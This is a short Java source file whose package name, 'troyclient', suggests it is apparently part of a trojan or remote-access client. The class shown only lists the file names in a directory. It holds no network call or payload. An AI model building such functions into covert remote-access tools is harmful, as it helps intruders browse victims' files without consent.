package ch.lebois.troyclient.functions;

import java.io.File;
import java.util.ArrayList;

/**
 * Project: Hermann
 **/
public class ListFilesFunction {

    public static ArrayList<String> ls(String path) {
        System.out.println("ls -> " + path);
        if (path.equals("")) {
            path = System.getProperty("user.dir");
        }
        File file = new File(path);
        try {
            ArrayList<String> files = new ArrayList<>();
            for (File subFile : file.listFiles()) {
                files.add(subFile.getName());
            }
            return files;
        } catch (NullPointerException e) {

            return null;
        }
    }

}
